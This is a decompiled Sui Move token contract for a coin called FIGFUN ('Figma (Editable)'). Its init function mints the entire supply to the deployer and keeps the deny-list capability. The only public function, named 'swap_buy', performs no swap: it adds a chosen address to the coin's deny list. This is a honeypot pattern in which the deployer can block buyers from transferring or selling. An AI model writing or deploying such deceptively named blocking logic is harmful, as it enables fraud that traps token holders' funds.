module 0xf757b63f91cedb064abbb008ad1ec00e646fbb3f6a414cd1ef90aef701e94e34::figfun {
    struct FIGFUN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: FIGFUN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FIGFUN>(arg0, 9, b"FIGFUN", b"Figma (Editable)", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmNoaRp1gVhMgVaWztobqiMe2pXL8AcxbzMgcVCbPgXaAp"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<FIGFUN>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FIGFUN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<FIGFUN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<FIGFUN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FIGFUN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FIGFUN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

